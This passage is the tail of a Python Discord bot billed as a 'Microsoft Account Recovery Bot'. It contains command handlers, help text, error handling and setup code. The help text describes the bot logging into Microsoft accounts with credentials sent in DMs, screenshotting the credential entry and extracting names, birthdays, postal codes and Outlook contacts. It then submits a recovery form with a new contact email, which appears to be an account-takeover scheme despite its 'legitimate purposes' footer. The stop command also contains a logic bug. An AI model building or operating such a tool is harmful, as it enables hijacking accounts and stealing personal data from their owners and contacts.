async def solve_captcha(ctx, *, captcha_text=None):
    """Solve a CAPTCHA during recovery process"""
    if ctx.author.id not in captcha_sessions:
        await ctx.send("❌ No active CAPTCHA session found! Start a recovery with `!recover` first.")
        return
    
    if not captcha_text:
        await ctx.send("❌ Please provide the CAPTCHA text! Example: `!captcha ABC123`")
        return
    
    await ctx.send(f"✅ CAPTCHA solution received: `{captcha_text}`")
    await ctx.send("⚠️ Note: The bot should automatically detect and process CAPTCHAs. This command is for manual override if needed.")

@bot.command(name="ss")
async def take_screenshot_command(ctx):
    """Take a screenshot during recovery process"""
    if ctx.author.id not in active_sessions:
        await ctx.send("❌ No active recovery session found! Start one with `!recover`")
        return
    
    embed = discord.Embed(
        title="📸 Screenshot Feature",
        description="Screenshots are automatically taken during the recovery process at key steps:\n\n• Initial login page\n• After entering credentials\n• After login attempt\n• During form filling\n• CAPTCHA detection\n• After form submission\n\nCheck the chat history for screenshots!",
        color=discord.Color.blue()
    )
    await ctx.send(embed=embed)

@bot.command(name="stop")
async def stop_recovery(ctx):
    """Stop current recovery session"""
    if ctx.author.id in active_sessions:
        del active_sessions[ctx.author.id]
    if ctx.author.id in captcha_sessions:
        del captcha_sessions[ctx.author.id]
    await ctx.send("✅ Session stopped!")
    await ctx.send("❌ No active session found!")

@bot.command(name="status")
async def bot_status(ctx):
    """Check bot status"""
    embed = discord.Embed(
        title="🤖 Bot Status",
        color=discord.Color.blue()
    )
    embed.add_field(name="Active Sessions", value=str(len(active_sessions)), inline=True)
    embed.add_field(name="CAPTCHA Sessions", value=str(len(captcha_sessions)), inline=True)
    embed.add_field(name="Ping", value=f"{round(bot.latency * 1000)}ms", inline=True)
    embed.set_footer(text="Microsoft Account Recovery Bot")
    
    await ctx.send(embed=embed)

@bot.command(name="help")
async def bot_help(ctx):
    """Show help menu"""
    embed = discord.Embed(
        title="🆘 Microsoft Account Recovery Bot Help",
        description="**Fully Automatic** Microsoft account recovery tool with CAPTCHA support",
        color=discord.Color.green()
    )
    
    embed.add_field(
        name="Commands",
        value="""
        `!recover` - Start account recovery process (use in DMs)
        `!captcha <text>` - Solve CAPTCHA during recovery
        `!ss` - Show screenshot information
        `!stop` - Stop current session
        `!status` - Check bot status
        `!help` - Show this help menu
        `!install` - Install Chrome on VPS (Owner only)
        """,
        inline=False
    )
    
    embed.add_field(
        name="Recovery Process",
        value="""
        1. **Login** - Automatically logs into Microsoft account
        2. **Data Extraction** - **Extracts REAL account data** (name, email, birthday, etc.)
        3. **Recovery Form** - Navigates to recovery page
        4. **Contact Email** - **Asks you for a contact email**
        5. **CAPTCHA** - **Asks you for CAPTCHA text**
        6. **Submission** - Submits the recovery form
        """,
        inline=False
    )
    
    embed.add_field(
        name="Data Extraction",
        value="""
        The bot now **extracts REAL data** from your Microsoft account:
        • **Name** from profile page
        • **Birthday** if available
        • **Country** information
        • **Postal Code** from address book
        • **Email contacts** from Outlook
        """,
        inline=False
    )
    
    embed.add_field(
        name="User Interaction Required",
        value="""
        The bot will ask you for:
        • **Contact Email** - Different from the account being recovered
        • **CAPTCHA Text** - Characters from the CAPTCHA image
        
        You'll have **120 seconds** to respond to each request.
        """,
        inline=False
    )
    
    embed.add_field(
        name="Security Note",
        value="Always use this bot in Direct Messages to protect your credentials.",
        inline=False
    )
    
    embed.set_footer(text="For legitimate account recovery purposes only")
    
    await ctx.send(embed=embed)

@bot.command(name="install")
@commands.is_owner()
async def install_chrome(ctx):
    """Install Chrome and ChromeDriver on VPS (Owner only)"""
    await ctx.send("🔧 Installing Chrome and ChromeDriver on VPS...")
    
    try:
        message = await ctx.send("📥 Starting installation... This may take a few minutes.")
        
        if ChromeDriverManager.install_chrome():
            await message.edit(content="✅ Chrome installation attempted!")
        else:
            await message.edit(content="⚠️ Chrome installation had issues")
        
        if ChromeDriverManager.install_chromedriver():
            await message.edit(content="✅ ChromeDriver installation attempted!")
        else:
            await message.edit(content="⚠️ ChromeDriver installation had issues")
        
        # Verify installation
        if ChromeDriverManager.check_installation():
            await message.edit(content="🎉 **Installation complete!** Bot is ready to use.")
        else:
            await message.edit(content="⚠️ **Installation attempted** but verification failed.\nCheck manually with: `google-chrome --version` and `chromedriver --version`")
        
    except Exception as e:
        await ctx.send(f"❌ Installation failed: {str(e)[:200]}")

# Error handling
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.NotOwner):
        await ctx.send("❌ Owner-only command!")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send("❌ Missing required argument! Use `!help` for command usage.")
    elif isinstance(error, asyncio.TimeoutError):
        await ctx.send("❌ Command timed out!")
    else:
        error_msg = str(error)[:100]
        await ctx.send(f"❌ Error: {error_msg}...")

# Run the bot
if __name__ == "__main__":
    # Check for token
    if TOKEN == "YOUR_DISCORD_BOT_TOKEN_HERE":
        print("❌ ERROR: You need to set your Discord bot token!")
        print("\n📝 **HOW TO SET UP THE BOT:**")
        print("1. Replace 'YOUR_DISCORD_BOT_TOKEN_HERE' with your actual bot token")
        print("2. Save the file")
        print("3. Run: python3 bot.py")
        print("\n🔧 **To get a bot token:**")
        print("1. Go to https://discord.com/developers/applications")
        print("2. Create a new application")
        print("3. Go to Bot section")
        print("4. Click 'Reset Token' and copy it")
        print("5. Paste it in the code where it says YOUR_DISCORD_BOT_TOKEN_HERE")
        sys.exit(1)
    
    print("🤖 Starting Microsoft Account Recovery Bot...")
    print("🔧 Checking VPS compatibility...")
    
    # Install PIL if not installed
    try:
        from PIL import Image
    except ImportError:
        print("📦 Installing PIL/Pillow for image processing...")
        subprocess.run([sys.executable, "-m", "pip", "install", "Pillow"])
    
    # Check if Chrome is installed
    if not ChromeDriverManager.check_installation():
        print("\n⚠️ Chrome/ChromeDriver not found or not fully installed.")
        print("\n💡 **Install with:** `!install` (bot owner only)")
        print("💡 **Or install manually:**")
        print("""
        sudo apt update
        sudo apt install -y wget unzip curl gnupg ca-certificates
        wget -q -O - https://dl.google.com/linux/linux_signing_key.pub | sudo apt-key add -
        sudo sh -c 'echo "deb [arch=amd64] https://dl.google.com/linux/chrome/deb/ stable main" > /etc/apt/sources.list.d/google-chrome.list'
        sudo apt update
        sudo apt install -y google-chrome-stable
        wget -q https://storage.googleapis.com/chrome-for-testing-public/latest/linux64/chromedriver-linux64.zip
        unzip -q chromedriver-linux64.zip
        sudo mv chromedriver-linux64/chromedriver /usr/local/bin/chromedriver
        sudo chmod +x /usr/local/bin/chromedriver
        rm -rf chromedriver-linux64.zip chromedriver-linux64
        """)
    
    print("\n✅ Bot is starting...")
    print("💡 Use `!help` in Discord for commands")
    
    try:
        bot.run(TOKEN)
    except discord.LoginFailure:
        print("❌ Invalid Discord bot token!")
        print("📝 Make sure you replaced 'YOUR_DISCORD_BOT_TOKEN_HERE' with your actual token")
        sys.exit(1)
    except Exception as e:
        print(f"❌ Failed to start bot: {e}")